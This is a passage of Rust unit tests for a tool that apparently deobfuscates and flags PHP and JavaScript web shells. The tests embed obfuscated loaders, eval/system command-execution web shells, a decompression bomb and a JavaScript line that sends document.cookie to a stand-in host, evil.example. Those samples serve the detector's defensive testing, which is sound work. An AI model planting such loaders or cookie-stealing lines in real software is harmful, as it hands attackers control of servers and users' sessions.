        assert!(!n.contains("@hidden"), "{n}");
    }

    #[test]
    fn folds_short_decoder_calls() {
        let n = norm(
            "<?php $f = strrev('metsys'); $g = str_rot13('riny'); $h = base64_decode('ZXZhbA==');",
        );
        assert!(n.contains("$f = /*@hidden*/'system'"), "{n}");
        assert!(n.contains("$g = /*@hidden*/'eval'"), "{n}");
        assert!(n.contains("$h = /*@hidden*/'eval'"), "{n}");
        // Nested and combined with concatenation.
        let n = norm("<?php $f = strrev(str_rot13('zrg'.'flf'));");
        assert!(n.contains("/*@hidden*/'system'"), "{n}");
    }

    #[test]
    fn strips_comments_only_in_php_code() {
        let n = normalize(
            b"<p>don't // keep</p><?php eval/*x*/($_POST['a']); # gone\n?>'",
            Lang::Php,
            false,
        );
        let text = String::from_utf8_lossy(&n.out);
        assert!(text.contains("don't // keep"), "{text}");
        assert!(text.contains("eval ($_POST['a'])"), "{text}");
        assert!(!text.contains("gone"), "{text}");
        assert!(n.interesting);
        // Ordinary comments do not make the layer worth a second scan.
        let n = normalize(
            b"<?php /** doc */ function a() { return 1; } // end\n",
            Lang::Php,
            false,
        );
        assert!(!n.interesting);
    }

    #[test]
    fn comment_inside_call_is_interesting() {
        for src in [
            "<?php eval(/**/$_POST['x']);",
            "<?php eval // split\n ($_POST['x']);",
            "<?php $_PO/**/ST;",
        ] {
            assert!(
                normalize(src.as_bytes(), Lang::Php, false).interesting,
                "{src}"
            );
        }
    }

    #[test]
    fn decodes_explicit_chain() {
        let payload = b"if(isset($_POST['k'])){ system($_POST['k']); }";
        let src = format!(
            "<?php eval(gzinflate(base64_decode('{}')));",
            b64(&deflate(payload))
        );
        let layers = layers(src.as_bytes(), Lang::Php, &Limits::default());
        let hit = layers
            .iter()
            .find(|l| l.data == payload)
            .expect("payload layer");
        assert_eq!(hit.chain, "base64_decode → gzinflate");
        assert!(hit.decoded && hit.depth == 1);
    }

    #[test]
    fn decodes_nested_layers() {
        let inner = b"system($_REQUEST['cmd']); /* innermost payload */";
        let level1 = format!("eval(base64_decode('{}'));", b64(inner));
        // str_rot13 only rotates letters, so the wrapper is built by rotating
        // the compressed bytes before encoding them.
        let rotated: Vec<u8> = deflate(level1.as_bytes())
            .iter()
            .map(|b| rot13(*b))
            .collect();
        let level2_ok = format!(
            "eval(gzinflate(str_rot13(base64_decode('{}'))));",
            b64(&rotated)
        );
        let src = format!("<?php {level2_ok}");
        let layers = layers(src.as_bytes(), Lang::Php, &Limits::default());
        assert!(
            layers.iter().any(|l| l.data == inner && l.depth == 2),
            "{layers:#?}"
        );
    }

    #[test]
    fn decodes_blind_when_decoder_is_hidden() {
        let payload = b"@eval($_POST['secret_key_value']); // loader stage two";
        let mut z = ZlibEncoder::new(Vec::new(), Compression::default());
        z.write_all(payload).unwrap();
        let src = format!(
            "<?php $d = '{}'; $a = 'base'.'64_decode'; $b = 'gzun'.'compress'; eval($b($a($d)));",
            b64(&z.finish().unwrap())
        );
        let layers = layers(src.as_bytes(), Lang::Php, &Limits::default());
        assert!(layers.iter().any(|l| l.data == payload), "{layers:#?}");
        assert!(layers
            .iter()
            .any(|l| l.depth == 0 && contains(&l.data, b"/*@hidden*/'base64_decode'")));
    }

    #[test]
    fn javascript_layers() {
        let src = format!(
            "var u = 'ht' + 'tps://evil.example/c'; var f = String.fromCharCode(101,118,97,108); new Function(atob('{}'))();",
            b64(b"fetch('https://evil.example/?d=' + btoa(document.cookie));")
        );
        let layers = layers(src.as_bytes(), Lang::Js, &Limits::default());
        let normalized = String::from_utf8_lossy(&layers[0].data).into_owned();
        assert!(
            normalized.contains("/*@hidden*/'https://evil.example/c'"),
            "{normalized}"
        );
        assert!(normalized.contains("/*@hidden*/'eval'"), "{normalized}");
        assert!(layers
            .iter()
            .any(|l| l.decoded && contains(&l.data, b"document.cookie")));
    }

    #[test]
    fn decompression_bomb_is_bounded() {
        let bomb = vec![b'A'; 64 * 1024 * 1024];
        let src = format!(
            "<?php eval(gzinflate(base64_decode('{}')));",
            b64(&deflate(&bomb))
        );
        let limits = Limits::default();
        let layers = layers(src.as_bytes(), Lang::Php, &limits);
        assert!(layers
            .iter()
            .all(|l| l.data.len() <= limits.max_payload_bytes));
        let total: usize = layers.iter().map(|l| l.data.len()).sum();
        assert!(total <= limits.max_total_bytes);
    }

    #[test]
    fn never_panics_on_arbitrary_input() {
        // Deterministic pseudo-random inputs biased towards the bytes the
        // tokenizer treats specially.
        const ALPHABET: &[u8] = b"'\"`\\/*#<?>.+()x0123u{}chr \nphpSEOT=$_a";
        let mut seed = 0x2545_f491_4f6c_dd1du64;
        for round in 0..4000 {
            let len = (round % 97) + 1;
            let mut input = Vec::with_capacity(len);
            for _ in 0..len {
                seed ^= seed << 13;
                seed ^= seed >> 7;
                seed ^= seed << 17;
                input.push(ALPHABET[(seed % ALPHABET.len() as u64) as usize]);
            }
            for lang in [Lang::Php, Lang::Js] {
                let _ = layers(&input, lang, &Limits::default());
                let _ = normalize(&input, lang, true);
            }
        }
    }

    #[test]
    fn base64_is_lenient_like_php() {
        assert_eq!(base64_decode(b"ZXZhbA==").unwrap(), b"eval");
        assert_eq!(base64_decode(b"ZXZh\nbA").unwrap(), b"eval");
        assert!(base64_decode(b"!!").is_none());
    }
}
